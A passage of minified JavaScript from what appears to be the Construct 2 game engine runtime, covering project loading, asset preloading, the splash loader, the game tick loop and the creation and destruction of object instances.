t,e,i;for(this.glwrap.contextLost(),this.is_WebGL_context_lost=!0,t=0,e=this.types_by_index.length;t<e;t++)(i=this.types_by_index[t]).onLostWebGLContext&&i.onLostWebGLContext()},i.prototype.onContextRestored=function(){var t,e,i;for(this.is_WebGL_context_lost=!1,t=0,e=this.types_by_index.length;t<e;t++)(i=this.types_by_index[t]).onRestoreWebGLContext&&i.onRestoreWebGLContext()},i.prototype.positionOverlayCanvas=function(){var t;this.isDomFree||((t=(document.mozFullScreen||document.webkitIsFullScreen||document.fullScreen||!!document.msFullscreenElement||this.isNodeFullscreen)&&!this.isCordova?jQuery(this.canvas).offset():jQuery(this.canvas).position()).position="absolute",jQuery(this.overlay_canvas).css(t))};var s=window.cancelAnimationFrame||window.mozCancelAnimationFrame||window.webkitCancelAnimationFrame||window.msCancelAnimationFrame||window.oCancelAnimationFrame;i.prototype.setSuspended=function(t){var e,i;if(t&&!this.isSuspended)for(cr.logexport("[Construct 2] Suspending"),this.isSuspended=!0,-1!==this.raf_id&&s&&s(this.raf_id),-1!==this.timeout_id&&clearTimeout(this.timeout_id),e=0,i=this.suspend_events.length;e<i;e++)this.suspend_events[e](!0);else if(!t&&this.isSuspended){for(cr.logexport("[Construct 2] Resuming"),this.isSuspended=!1,this.last_tick_time=cr.performance_now(),this.last_fps_time=cr.performance_now(),this.framecount=0,e=this.logictime=0,i=this.suspend_events.length;e<i;e++)this.suspend_events[e](!1);this.tick(!1)}},i.prototype.addSuspendCallback=function(t){this.suspend_events.push(t)},i.prototype.GetObjectReference=function(t){return this.objectRefTable[t]};var g=!(i.prototype.loadProject=function(t){t&&t.project||cr.logerror("Project model unavailable");var e,i,s,n,r,o,a,h,c,l,u,p,d,g,f,m,y,_,v,b,w=t.project;for(this.name=w[0],this.first_layout=w[1],this.fullscreen_mode=w[12],this.fullscreen_mode_set=w[12],this.original_width=w[10],this.original_height=w[11],this.parallax_x_origin=this.original_width/2,this.parallax_y_origin=this.original_height/2,this.isDomFree&&!this.isEjecta&&(4<=w[12]||0===w[12])&&(cr.logexport("[Construct 2] Letterbox scale fullscreen modes are not supported on this platform - falling back to 'Scale outer'"),this.fullscreen_mode=3,this.fullscreen_mode_set=3),this.uses_loader_layout=w[18],this.loaderstyle=w[19],0===this.loaderstyle?((u=new Image).crossOrigin="anonymous",this.setImageSrc(u,"https://427396048-642845047394716217.preview.editmysite.com/uploads/b/139890129-761103484729797659/files/loading-logo.png"),this.loaderlogos={logo:u}):4===this.loaderstyle&&((e=new Image).src="",(i=new Image).src="",(s=new Image).src="",(n=new Image).src="",(r=new Image).src="",(o=new Image).src="",(a=new Image).src="",(h=new Image).src="",(c=new Image).src="",(l=new Image).src="",(t=new Image).src="",(u=new Image).src="",this.loaderlogos={logo:[e,i,s,n],powered:[r,o,a,h],website:[c,l,t,u]}),this.next_uid=w[21],this.objectRefTable=cr.getObjectRefTable(),this.system=new cr.system_object(this),p=0,d=w[2].length;p<d;p++)g=w[2][p],_=this.GetObjectReference(g[0]),cr.add_common_aces(g,_.prototype),(v=new _(this)).singleglobal=g[1],v.is_world=g[2],v.is_rotatable=g[5],v.must_predraw=g[9],v.onCreate&&v.onCreate(),cr.seal(v),this.plugins.push(v);for(this.objectRefTable=cr.getObjectRefTable(),p=0,d=w[3].length;p<d;p++){for(g=w[3][p],b=this.GetObjectReference(g[1]),v=null,M=0,F=this.plugins.length;M<F;M++)if(this.plugins[M]instanceof b){v=this.plugins[M];break}var x,S=new v.Type(v);for(S.name=g[0],S.is_family=g[2],S.instvar_sids=g[3].slice(0),S.vars_count=g[3].length,S.behs_count=g[4],S.fx_count=g[5],S.sid=g[11],S.is_family?(S.members=[],S.family_index=this.family_count++,S.families=null):(S.members=null,S.family_index=-1,S.families=[]),S.family_var_map=null,S.family_beh_map=null,S.family_fx_map=null,S.is_contained=!1,S.container=null,g[6]?(S.texture_file=g[6][0],S.texture_filesize=g[6][1],S.texture_pixelformat=g[6][2]):(S.texture_file=null,S.texture_filesize=0,S.texture_pixelformat=0),g[7]?S.animations=g[7]:S.animations=null,S.index=p,S.instances=[],S.deadCache=[],S.solstack=[new cr.selection(S)],S.cur_sol=0,S.default_instance=null,S.default_layerindex=0,S.stale_iids=!0,S.updateIIDs=cr.type_updateIIDs,S.getFirstPicked=cr.type_getFirstPicked,S.getPairedInstance=cr.type_getPairedInstance,S.getCurrentSol=cr.type_getCurrentSol,S.pushCleanSol=cr.type_pushCleanSol,S.pushCopySol=cr.type_pushCopySol,S.popSol=cr.type_popSol,S.getBehaviorByName=cr.type_getBehaviorByName,S.getBehaviorIndexByName=cr.type_getBehaviorIndexByName,S.getEffectIndexByName=cr.type_getEffectIndexByName,S.applySolToContainer=cr.type_applySolToContainer,S.getInstanceByIID=cr.type_getInstanceByIID,S.collision_grid=new cr.SparseGrid(this.original_width,this.original_height),S.any_cell_changed=!0,S.any_instance_parallaxed=!1,S.extra={},S.toString=cr.type_toString,S.behaviors=[],M=0,F=g[8].length;M<F;M++){f=g[8][M];for(var T=this.GetObjectReference(f[1]),C=null,O=0,k=this.behaviors.length;O<k;O++)if(this.behaviors[O]instanceof T){C=this.behaviors[O];break}C||((C=new T(this)).my_types=[],C.my_instances=new cr.ObjectSet,C.onCreate&&C.onCreate(),cr.seal(C),this.behaviors.push(C),cr.behaviors.solid&&C instanceof cr.behaviors.solid&&(this.solidBehavior=C),cr.behaviors.jumpthru&&C instanceof cr.behaviors.jumpthru&&(this.jumpthruBehavior=C),cr.behaviors.shadowcaster&&C instanceof cr.behaviors.shadowcaster&&(this.shadowcasterBehavior=C)),-1===C.my_types.indexOf(S)&&C.my_types.push(S);var A=new C.Type(C,S);A.name=f[0],A.sid=f[2],A.onCreate(),cr.seal(A),S.behaviors.push(A)}for(S.global=g[9],S.isOnLoaderLayout=g[10],S.effect_types=[],M=0,F=g[12].length;M<F;M++)S.effect_types.push({id:g[12][M][0],name:g[12][M][1],shaderindex:-1,preservesOpaqueness:!1,active:!0,index:M});S.tile_poly_data=g[13],this.uses_loader_layout&&!S.is_family&&!S.isOnLoaderLayout&&v.is_world||(S.onCreate(),cr.seal(S)),S.name&&(this.types[S.name]=S),this.types_by_index.push(S),v.singleglobal&&((x=new v.Instance(S)).uid=this.next_uid++,x.puid=this.next_puid++,x.iid=0,x.get_iid=cr.inst_get_iid,x.toString=cr.inst_toString,x.properties=g[14],x.onCreate(),cr.seal(x),S.instances.push(x),this.objectsByUid[x.uid.toString()]=x)}for(p=0,d=w[4].length;p<d;p++)for(var E,I=w[4][p],P=this.types_by_index[I[0]],M=1,F=I.length;M<F;M++)(E=this.types_by_index[I[M]]).families.push(P),P.members.push(E);for(p=0,d=w[28].length;p<d;p++){var L=w[28][p],D=[];for(M=0,F=L.length;M<F;M++)D.push(this.types_by_index[L[M]]);for(M=0,F=D.length;M<F;M++)D[M].is_contained=!0,D[M].container=D}if(0<this.family_count)for(p=0,d=this.types_by_index.length;p<d;p++)if(!(m=this.types_by_index[p]).is_family&&m.families.length){m.family_var_map=new Array(this.family_count),m.family_beh_map=new Array(this.family_count),m.family_fx_map=new Array(this.family_count);var R=[],j=0,B=0,N=0;for(M=0,F=m.families.length;M<F;M++)for(y=m.families[M],m.family_var_map[y.family_index]=j,j+=y.vars_count,m.family_beh_map[y.family_index]=B,B+=y.behs_count,m.family_fx_map[y.family_index]=N,N+=y.fx_count,O=0,k=y.effect_types.length;O<k;O++)R.push(cr.shallowCopy({},y.effect_types[O]));for(m.effect_types=R.concat(m.effect_types),M=0,F=m.effect_types.length;M<F;M++)m.effect_types[M].index=M}for(p=0,d=w[5].length;p<d;p++){g=w[5][p];var V=new cr.layout(this,g);cr.seal(V),this.layouts[V.name]=V,this.layouts_by_index.push(V)}for(p=0,d=w[6].length;p<d;p++){g=w[6][p];var G=new cr.eventsheet(this,g);cr.seal(G),this.eventsheets[G.name]=G,this.eventsheets_by_index.push(G)}for(p=0,d=this.eventsheets_by_index.length;p<d;p++)this.eventsheets_by_index[p].postInit();for(p=0,d=this.eventsheets_by_index.length;p<d;p++)this.eventsheets_by_index[p].updateDeepIncludes();for(p=0,d=this.triggers_to_postinit.length;p<d;p++)this.triggers_to_postinit[p].postInit();cr.clearArray(this.triggers_to_postinit),this.audio_to_preload=w[7],this.files_subfolder=w[8],this.pixel_rounding=w[9],this.aspect_scale=1,this.enableWebGL=w[13],this.linearSampling=w[14],this.clearBackground=w[15],this.versionstr=w[16],this.useHighDpi=w[17],this.orientations=w[20],this.autoLockOrientation=0<this.orientations,this.pauseOnBlur=w[22],this.wantFullscreenScalingQuality=w[23],this.fullscreenScalingQuality=this.wantFullscreenScalingQuality,this.downscalingQuality=w[24],this.preloadSounds=w[25],this.projectName=w[26],this.enableFrontToBack=w[27]&&!this.isIE,this.start_time=Date.now(),cr.clearArray(this.objectRefTable),this.initRendererAndLoader()}),n=0,r=[];i.prototype.queueImageLoad=function(t,e){function i(){n--,s.maybeLoadNextImages()}var s=this;t.addEventListener("load",i),t.addEventListener("error",i),r.push([t,e]),this.maybeLoadNextImages()},i.prototype.maybeLoadNextImages=function(){for(var t;r.length&&n<100;)n++,t=r.shift(),this.setImageSrc(t[0],t[1])},i.prototype.waitForImageLoad=function(e,i){e.cocoonLazyLoad=!0,e.onerror=function(t){e.c2error=!0,g=!0,console&&console.error&&console.error("Error loading image '"+e.src+"': ",t)},this.isEjecta?e.src=i:e.src||("undefined"!=typeof XAPKReader?XAPKReader.get(i,function(t){e.src=t},function(t){e.c2error=!0,g=!0,console&&console.error&&console.error("Error extracting image '"+i+"' from expansion file: ",t)}):(e.crossOrigin="anonymous",this.queueImageLoad(e,i))),this.wait_for_textures.push(e)};var h=0,c=!(i.prototype.findWaitingTexture=function(t){for(var e=0,i=this.wait_for_textures.length;e<i;e++)if(this.wait_for_textures[e].cr_src===t)return this.wait_for_textures[e];return null});i.prototype.getready=function(){this.audioInstance&&(h=this.audioInstance.setPreloadList(this.audio_to_preload))};var f=!(i.prototype.areAllTexturesAndSoundsLoaded=function(){for(var t,e,i=h,s=0,n=!0,r=0,o=this.wait_for_textures.length;r<o;r++){var a=(e=this.wait_for_textures[r]).cr_filesize;(!a||a<=0)&&(a=5e4),i+=a,e.src&&(e.complete||e.loaded)&&!e.c2error?s+=a:n=!1}return n&&this.preloadSounds&&this.audioInstance&&(c||(this.audioInstance.startPreloads(),c=!0),s+=t=this.audioInstance.getPreloadedSize(),t<h&&(n=!1)),this.progress=0==i?1:s/i,n});i.prototype.go=function(){if(this.ctx||this.glwrap){var t=this.ctx||this.overlay_ctx;this.overlay_canvas&&this.positionOverlayCanvas();var e=window.innerWidth,i=window.innerHeight;this.lastWindowWidth===e&&this.lastWindowHeight===i||this.setSize(e,i),this.progress=0,this.last_progress=-1;var s=this;if(this.areAllTexturesAndSoundsLoaded()&&(4!==this.loaderstyle||f))this.go_loading_finished();else{var n=Date.now()-this.start_time;if(t){var r=this.width,o=this.height,a=this.devicePixelRatio;if(this.loaderstyle<3&&(this.isCocoonJs||500<=n&&this.last_progress!=this.progress)){t.clearRect(0,0,r,o);var h=r/2,c=o/2,l=0===this.loaderstyle&&this.loaderlogos.logo.complete,e=40*a,i=0,n=80*a;l&&(e=(n=(r=this.loaderlogos.logo).width*a)/2,i=(o=r.height*a)/2,t.drawImage(r,cr.floor(h-e),cr.floor(c-i),n,o)),this.loaderstyle<=1?(c+=i+(l?12*a:0),h-=e,h=cr.floor(h)+.5,c=cr.floor(c)+.5,t.fillStyle=g?"red":"DodgerBlue",t.fillRect(h,c,Math.floor(n*this.progress),6*a),t.strokeStyle="black",t.strokeRect(h,c,n,6*a),t.strokeStyle="white",t.strokeRect(h-+a,c-+a,n+2*a,8*a)):2===this.loaderstyle&&(t.font=this.isEjecta?"12pt ArialMT":"12pt Arial",t.fillStyle=g?"#f00":"#999",t.textBaseLine="middle",n=Math.round(100*this.progress)+"%",a=(a=t.measureText?t.measureText(n):null)?a.width:0,t.fillText(n,h-a/2,c)),this.last_progress=this.progress}else if(4===this.loaderstyle)return this.draw_c2_splash_loader(t),void(u?u(function(){s.go()}):setTimeout(function(){s.go()},16))}setTimeout(function(){s.go()},this.isCocoonJs?10:100)}}};var m=-1,y="undefined"==typeof cr_is_preview?200:0,_=!0,v=!1,b=0,w=0,x="undefined"==typeof cr_is_preview?3e3:0,S=null,T=null,C=0;function O(t,e){return e<=128?t[3]:e<=256?t[2]:e<=512?t[1]:t[0]}i.prototype.draw_c2_splash_loader=function(t){if(!f){for(var e=Math.ceil(this.width),i=Math.ceil(this.height),s=(this.devicePixelRatio,this.loaderlogos.logo),n=this.loaderlogos.powered,r=this.loaderlogos.website,o=0;o<4;++o)if(!s[o].complete||!n[o].complete||!r[o].complete)return;0===C&&(m=Date.now());var a,h,c,l,u=Date.now(),p=!1,d=t;_||v?(t.clearRect(0,0,e,i),c=e,l=i,S&&S.width===c&&S.height===l||((S=document.createElement("canvas")).width=c,S.height=l,T=S.getContext("2d")),d=T,p=!0,_&&1===C&&(m=Date.now())):t.globalAlpha=1,d.fillStyle="#333333",d.fillRect(0,0,e,i),256<this.cssHeight?(h=.25*(a=cr.clamp(.22*i,105,.6*e)),d.drawImage(O(n,a),.5*e-a/2,.2*i-h/2,a,h),h=a=Math.min(.395*i,.95*e),d.drawImage(O(s,a),.5*e-a/2,.485*i-h/2,a,h),h=.25*(a=cr.clamp(.22*i,105,.6*e)),d.drawImage(O(r,a),.5*e-a/2,.868*i-h/2,a,h),d.fillStyle="#3C3C3C",a=e,h=Math.max(.005*i,2),d.fillRect(0,.8*i-h/2,a,h),d.fillStyle=g?"red":"#E0FF65",a=e*this.progress,d.fillRect(.5*e-a/2,.8*i-h/2,a,h)):(h=a=.55*i,d.drawImage(O(s,a),.5*e-a/2,.45*i-h/2,a,h),d.fillStyle="#3C3C3C",a=e,h=Math.max(.005*i,2),d.fillRect(0,.85*i-h/2,a,h),d.fillStyle=g?"red":"#E0FF65",a=e*this.progress,d.fillRect(.5*e-a/2,.85*i-h/2,a,h)),p&&(_?t.globalAlpha=0===C?0:Math.min((u-m)/300,1):v&&(t.globalAlpha=Math.max(1-(u-w)/300,0)),t.drawImage(S,0,0,e,i)),_&&300<=u-m&&2<=C&&(_=!1,b=u),!_&&x<=u-b&&!v&&1<=this.progress&&(v=!0,w=u),(v&&300+y<=u-w||"undefined"!=typeof cr_is_preview&&1<=this.progress&&Date.now()-m<500)&&(v=_=!(f=!0),T=S=null,this.loaderlogos=null),++C}},i.prototype.go_loading_finished=function(){var t,e,i,s,n;if(this.overlay_canvas&&(this.canvas.parentNode.removeChild(this.overlay_canvas),this.overlay_ctx=null,this.overlay_canvas=null),this.start_time=Date.now(),this.last_fps_time=cr.performance_now(),this.uses_loader_layout)for(t=0,e=this.types_by_index.length;t<e;t++)(i=this.types_by_index[t]).is_family||i.isOnLoaderLayout||!i.plugin.is_world||(i.onCreate(),cr.seal(i));else this.isloading=!1;for(t=0,e=this.layouts_by_index.length;t<e;t++)this.layouts_by_index[t].createGlobalNonWorlds();for(2<=this.fullscreen_mode&&(s=this.original_width/this.original_height,n=this.width/this.height,2!==this.fullscreen_mode&&s<n||2===this.fullscreen_mode&&n<s?this.aspect_scale=this.height/this.original_height:this.aspect_scale=this.width/this.original_width),(this.first_layout?this.layouts[this.first_layout]:this.layouts_by_index[0]).startRunning(),this.uses_loader_layout||(this.loadingprogress=1,this.trigger(cr.system_object.prototype.cnds.OnLoadFinished,null),window.C2_RegisterSW&&window.C2_RegisterSW()),navigator.splashscreen&&navigator.splashscreen.hide&&navigator.splashscreen.hide(),t=0,e=this.types_by_index.length;t<e;t++)(i=this.types_by_index[t]).onAppBegin&&i.onAppBegin();document.hidden||document.webkitHidden||document.mozHidden||document.msHidden?window.cr_setSuspended(!0):this.tick(!1),this.isDirectCanvas&&AppMobi.webview.execute("onGameReady();")},i.prototype.tick=function(t,e,i){var s,n,r;this.running_layout&&(s=r=cr.performance_now(),!i&&this.isSuspended&&!t||(t||(u?this.raf_id=u(this.tickFunc):this.timeout_id=setTimeout(this.tickFunc,this.isMobile?1:16)),n=e||r,i=this.fullscreen_mode,((e=(document.mozFullScreen||document.webkitIsFullScreen||document.fullScreen||!!document.msFullscreenElement)&&!this.isCordova)||this.isNodeFullscreen)&&0<this.fullscreen_scaling&&(i=this.fullscreen_scaling),0<i&&(r=window.innerWidth,i=window.innerHeight,this.lastWindowWidth===r&&this.lastWindowHeight===i||this.setSize(r,i)),this.isDomFree||(e?this.firstInFullscreen||(this.firstInFullscreen=!0):this.firstInFullscreen?(this.firstInFullscreen=!1,0===this.fullscreen_mode&&this.setSize(Math.round(this.oldWidth/this.devicePixelRatio),Math.round(this.oldHeight/this.devicePixelRatio),!0)):(this.oldWidth=this.width,this.oldHeight=this.height)),this.isloading&&(e=this.areAllTexturesAndSoundsLoaded(),this.loadingprogress=this.progress,e&&(this.isloading=!1,this.progress=1,this.trigger(cr.system_object.prototype.cnds.OnLoadFinished,null),window.C2_RegisterSW&&window.C2_RegisterSW())),this.logic(n),!this.redraw&&!this.isCocoonJs||this.is_WebGL_context_lost||this.suspendDrawing||t||(this.redraw=!1,this.glwrap?this.drawGL():this.draw(),this.snapshotCanvas&&(this.canvas&&this.canvas.toDataURL&&(this.snapshotData=this.canvas.toDataURL(this.snapshotCanvas[0],this.snapshotCanvas[1]),window.cr_onSnapshot&&window.cr_onSnapshot(this.snapshotData),this.trigger(cr.system_object.prototype.cnds.OnCanvasSnapshot,null)),this.snapshotCanvas=null)),this.hit_breakpoint||(this.tickcount++,this.tickcount_nosave++,this.execcount++,this.framecount++),this.logictime+=cr.performance_now()-s))},i.prototype.logic=function(t){var e,i,s,n;1e3<=t-this.last_fps_time&&(this.last_fps_time+=1e3,1e3<=t-this.last_fps_time&&(this.last_fps_time=t),this.fps=this.framecount,this.framecount=0,this.cpuutilisation=this.logictime,this.logictime=0);var r=0;0!==this.last_tick_time&&((o=t-this.last_tick_time)<0&&(o=0),r=o/1e3,this.dt1=r,.5<this.dt1?this.dt1=0:this.dt1>1/this.minimumFramerate&&(this.dt1=1/this.minimumFramerate)),this.last_tick_time=t,this.dt=this.dt1*this.timescale,this.kahanTime.add(this.dt),this.wallTime.add(r);var o,a=(document.mozFullScreen||document.webkitIsFullScreen||document.fullScreen||!!document.msFullscreenElement||this.isNodeFullscreen)&&!this.isCordova;2<=this.fullscreen_mode||a&&0<this.fullscreen_scaling?(o=this.original_width/this.original_height,t=this.width/this.height,r=this.fullscreen_mode,a&&0<this.fullscreen_scaling&&(r=this.fullscreen_scaling),this.aspect_scale=2!==r&&o<t||2===r&&t<o?this.height/this.original_height:this.width/this.original_width,this.running_layout&&(this.running_layout.scrollToX(this.running_layout.scrollX),this.running_layout.scrollToY(this.running_layout.scrollY))):this.aspect_scale=this.isRetina?this.devicePixelRatio:1,this.ClearDeathRow(),this.isInOnDestroy++,this.system.runWaits(),this.isInOnDestroy--,this.ClearDeathRow(),this.isInOnDestroy++;for(var h=this.objects_to_pretick.valuesRef(),c=0,l=h.length;c<l;c++)h[c].pretick();for(c=0,l=this.types_by_index.length;c<l;c++)if(!(s=this.types_by_index[c]).is_family&&(s.behaviors.length||s.families.length))for(e=0,i=s.instances.length;e<i;e++)for(p=0,d=(u=s.instances[e]).behavior_insts.length;p<d;p++)u.behavior_insts[p].tick();for(c=0,l=this.types_by_index.length;c<l;c++)if(!(s=this.types_by_index[c]).is_family&&(s.behaviors.length||s.families.length))for(e=0,i=s.instances.length;e<i;e++)for(p=0,d=(u=s.instances[e]).behavior_insts.length;p<d;p++)(n=u.behavior_insts[p]).posttick&&n.posttick();for(c=0,l=(h=this.objects_to_tick.valuesRef()).length;c<l;c++)h[c].tick();for(this.isInOnDestroy--,this.handleSaveLoad(),c=0;this.changelayout&&c++<10;)this.doChangeLayout(this.changelayout);for(c=0,l=this.eventsheets_by_index.length;c<l;c++)this.eventsheets_by_index[c].hasRun=!1;for(this.running_layout.event_sheet&&this.running_layout.event_sheet.run(),cr.clearArray(this.registered_collisions),this.layout_first_tick=!1,this.isInOnDestroy++,c=0,l=this.types_by_index.length;c<l;c++)if(!(s=this.types_by_index[c]).is_family&&(s.behaviors.length||s.families.length))for(e=0,i=s.instances.length;e<i;e++)for(var u,p=0,d=(u=s.instances[e]).behavior_insts.length;p<d;p++)(n=u.behavior_insts[p]).tick2&&n.tick2();for(c=0,l=(h=this.objects_to_tick2.valuesRef()).length;c<l;c++)h[c].tick2();this.isInOnDestroy--},i.prototype.onWindowBlur=function(){for(var t,e,i,s,n,r,o,a=0,h=this.types_by_index.length;a<h;a++)if(!(n=this.types_by_index[a]).is_family)for(t=0,e=n.instances.length;t<e;t++)if((r=n.instances[t]).onWindowBlur&&r.onWindowBlur(),r.behavior_insts)for(i=0,s=r.behavior_insts.length;i<s;i++)(o=r.behavior_insts[i]).onWindowBlur&&o.onWindowBlur()},i.prototype.doChangeLayout=function(t){var e,i,s,n=this.running_layout;if(this.running_layout.stopRunning(),this.glwrap)for(e=0,i=this.types_by_index.length;e<i;e++)(s=this.types_by_index[e]).is_family||!s.unloadTextures||s.global&&0!==s.instances.length||-1!==t.initial_types.indexOf(s)||s.unloadTextures();n==t&&cr.clearArray(this.system.waits),cr.clearArray(this.registered_collisions),this.runLayoutChangeMethods(!0),t.startRunning(),this.runLayoutChangeMethods(!1),this.redraw=!0,this.layout_first_tick=!0,this.ClearDeathRow()},i.prototype.runLayoutChangeMethods=function(t){for(var e,i,s,n,r,o,a,h,c=0,l=this.behaviors.length;c<l;c++)e=this.behaviors[c],t?e.onBeforeLayoutChange&&e.onBeforeLayoutChange():e.onLayoutChange&&e.onLayoutChange();for(c=0,l=this.types_by_index.length;c<l;c++)if((i=this.types_by_index[c]).global||i.plugin.singleglobal)for(s=0,n=i.instances.length;s<n;s++)if(r=i.instances[s],t?r.onBeforeLayoutChange&&r.onBeforeLayoutChange():r.onLayoutChange&&r.onLayoutChange(),r.behavior_insts)for(o=0,a=r.behavior_insts.length;o<a;o++)h=r.behavior_insts[o],t?h.onBeforeLayoutChange&&h.onBeforeLayoutChange():h.onLayoutChange&&h.onLayoutChange()},i.prototype.pretickMe=function(t){this.objects_to_pretick.add(t)},i.prototype.unpretickMe=function(t){this.objects_to_pretick.remove(t)},i.prototype.tickMe=function(t){this.objects_to_tick.add(t)},i.prototype.untickMe=function(t){this.objects_to_tick.remove(t)},i.prototype.tick2Me=function(t){this.objects_to_tick2.add(t)},i.prototype.untick2Me=function(t){this.objects_to_tick2.remove(t)},i.prototype.getDt=function(t){return t&&-1!==t.my_timescale?this.dt1*t.my_timescale:this.dt},i.prototype.draw=function(){this.running_layout.draw(this.ctx),this.isDirectCanvas&&this.ctx.present()},i.prototype.drawGL=function(){this.enableFrontToBack&&(this.earlyz_index=1,this.running_layout.drawGL_earlyZPass(this.glwrap)),this.running_layout.drawGL(this.glwrap),this.glwrap.present()},i.prototype.addDestroyCallback=function(t){t&&this.destroycallbacks.push(t)},i.prototype.removeDestroyCallback=function(t){cr.arrayFindRemove(this.destroycallbacks,t)},i.prototype.getObjectByUID=function(t){t=t.toString();return this.objectsByUid.hasOwnProperty(t)?this.objectsByUid[t]:null};var d=[];i.prototype.DestroyInstance=function(t){var e,i,s=t.type.name,n=null;if(this.deathRow.hasOwnProperty(s)){if((n=this.deathRow[s]).contains(t))return}else n=d.length?d.pop():new cr.ObjectSet,this.deathRow[s]=n;if(n.add(t),this.hasPendingInstances=!0,t.is_contained)for(e=0,i=t.siblings.length;e<i;e++)this.DestroyInstance(t.siblings[e]);this.isInClearDeathRow&&n.values_cache.push(t),this.isEndingLayout||(this.isInOnDestroy++,this.trigger(Object.getPrototypeOf(t.type.plugin).cnds.OnDestroyed,t),this.isInOnDestroy--)},i.prototype.ClearDeathRow=function(){if(this.hasPendingInstances){var t,e,i,s,n,r;for(this.isInClearDeathRow=!0,i=0,n=this.createRow.length;i<n;++i)for((e=(t=this.createRow[i]).type).instances.push(t),s=0,r=e.families.length;s<r;++s)e.families[s].instances.push(t),e.families[s].stale_iids=!0;cr.clearArray(this.createRow),this.IterateDeathRow(),cr.wipe(this.deathRow),this.isInClearDeathRow=!1,this.hasPendingInstances=!1}},i.prototype.IterateDeathRow=function(){for(var t in this.deathRow)this.deathRow.hasOwnProperty(t)&&this.ClearDeathRowForType(this.deathRow[t])},i.prototype.ClearDeathRowForType=function(t){var e,i,s,n,r,o,a,h,c=t.valuesRef(),l=c[0].type;for(cr.arrayRemoveAllFromObjectSet(l.instances,t),l.stale_iids=!0,0===l.instances.length&&(l.any_instance_parallaxed=!1),e=0,i=l.families.length;e<i;++e)o=l.families[e],cr.arrayRemoveAllFromObjectSet(o.instances,t),o.stale_iids=!0;for(e=0,i=this.system.waits.length;e<i;++e)if((r=this.system.waits[e]).sols.hasOwnProperty(l.index)&&cr.arrayRemoveAllFromObjectSet(r.sols[l.index].insts,t),!l.is_family)for(s=0,n=l.families.length;s<n;++s)o=l.families[s],r.sols.hasOwnProperty(o.index)&&cr.arrayRemoveAllFromObjectSet(r.sols[o.index].insts,t);var u,p=c[0].layer;if(p){if(p.useRenderCells)for(e=0,i=(a=p.instances).length;e<i;++e)h=a[e],t.contains(h)&&(h.update_bbox(),p.render_grid.update(h,h.rendercells,null),h.rendercells.set(0,0,-1,-1));cr.arrayRemoveAllFromObjectSet(p.instances,t),p.setZIndicesStaleFrom(0)}for(e=0;e<c.length;++e)this.ClearDeathRowForSingleInstance(c[e],l);(u=t).clear(),d.push(u),this.redraw=!0},i.prototype.ClearDeathRowForSingleInstance=function(t,e){for(var i,s=0,n=this.destroycallbacks.length;s<n;++s)this.destroycallbacks[s](t);t.collcells&&e.collision_grid.update(t,t.collcells,null);var r=t.layer;if(r&&r.removeFromInstanceList(t,!0),t.behavior_insts)for(s=0,n=t.behavior_insts.length;s<n;++s)(i=t.behavior_insts[s]).onDestroy&&i.onDestroy(),i.behavior.my_instances.remove(t);this.objects_to_pretick.remove(t),this.objects_to_tick.remove(t),this.objects_to_tick2.remove(t),t.onDestroy&&t.onDestroy(),this.objectsByUid.hasOwnProperty(t.uid.toString())&&delete this.objectsByUid[t.uid.toString()],this.objectcount--,e.deadCache.length<100&&e.deadCache.push(t)},i.prototype.createInstance=function(t,e,i,s){if(t.is_family){var n=cr.floor(Math.random()*t.members.length);return this.createInstance(t.members[n],e,i,s)}return t.default_instance?this.createInstanceFromInit(t.default_instance,e,!1,i,s,!1):null};var k=[];i.prototype.createInstanceFromInit=function(t,e,i,s,n,r){var o,a,h,c,l;if(!t)return null;var u=this.types_by_index[t[1]],p=u.plugin.is_world;if(this.isloading&&p&&!u.isOnLoaderLayout)return null;if(p&&!this.glwrap&&11===t[0][11])return null;var d,g=e;for(p||(e=null),u.deadCache.length?((d=u.deadCache.pop()).recycled=!0,u.plugin.Instance.call(d,u)):(d=new u.plugin.Instance(u)).recycled=!1,!i||r||this.objectsByUid.hasOwnProperty(t[2].toString())?d.uid=this.next_uid++:d.uid=t[2],(this.objectsByUid[d.uid.toString()]=d).puid=this.next_puid++,d.iid=u.instances.length,o=0,a=this.createRow.length;o<a;++o)this.createRow[o].type===u&&d.iid++;d.get_iid=cr.inst_get_iid,d.toString=cr.inst_toString;var f,m,y=t[3];if(d.recycled)cr.wipe(d.extra);else{if(d.extra={},"undefined"!=typeof cr_is_preview)for(d.instance_var_names=[],d.instance_var_names.length=y.length,o=0,a=y.length;o<a;o++)d.instance_var_names[o]=y[o][1];d.instance_vars=[],d.instance_vars.length=y.length}for(o=0,a=y.length;o<a;o++)d.instance_vars[o]=y[o][0];if(p){var _=t[0];if(d.x=cr.is_undefined(s)?_[0]:s,d.y=cr.is_undefined(n)?_[1]:n,d.z=_[2],d.width=_[3],d.height=_[4],d.depth=_[5],d.angle=_[6],d.opacity=_[7],d.hotspotX=_[8],d.hotspotY=_[9],d.blend_mode=_[10],l=_[11],!this.glwrap&&u.effect_types.length&&(d.blend_mode=l),d.compositeOp=cr.effectToCompositeOp(d.blend_mode),this.gl&&cr.setGLBlend(d,d.blend_mode,this.gl),d.recycled){for(o=0,a=_[12].length;o<a;o++)for(h=0,c=_[12][o].length;h<c;h++)d.effect_params[o][h]=_[12][o][h];d.bbox.set(0,0,0,0),d.collcells.set(0,0,-1,-1),d.rendercells.set(0,0,-1,-1),d.bquad.set_from_rect(d.bbox),cr.clearArray(d.bbox_changed_callbacks)}else{for(d.effect_params=_[12].slice(0),o=0,a=d.effect_params.length;o<a;o++)d.effect_params[o]=_[12][o].slice(0);d.active_effect_types=[],d.active_effect_flags=[],d.active_effect_flags.length=u.effect_types.length,d.bbox=new cr.rect(0,0,0,0),d.collcells=new cr.rect(0,0,-1,-1),d.rendercells=new cr.rect(0,0,-1,-1),d.bquad=new cr.quad,d.bbox_changed_callbacks=[],d.set_bbox_changed=cr.set_bbox_changed,d.add_bbox_changed_callback=cr.add_bbox_changed_callback,d.contains_pt=cr.inst_contains_pt,d.update_bbox=cr.update_bbox,d.update_render_cell=cr.update_render_cell,d.update_collision_cell=cr.update_collision_cell,d.get_zindex=cr.inst_get_zindex}for(d.tilemap_exists=!1,d.tilemap_width=0,d.tilemap_height=0,d.tilemap_data=null,14===_.length&&(d.tilemap_exists=!0,d.tilemap_width=_[13][0],d.tilemap_height=_[13][1],d.tilemap_data=_[13][2]),o=0,a=u.effect_types.length;o<a;o++)d.active_effect_flags[o]=!0;d.shaders_preserve_opaqueness=!0,d.updateActiveEffects=cr.inst_updateActiveEffects,d.updateActiveEffects(),d.uses_shaders=!!d.active_effect_types.length,d.bbox_changed=!0,d.cell_changed=!0,u.any_cell_changed=!0,d.visible=!0,d.my_timescale=-1,d.layer=e,d.zindex=e.instances.length,void(d.earlyz_index=0)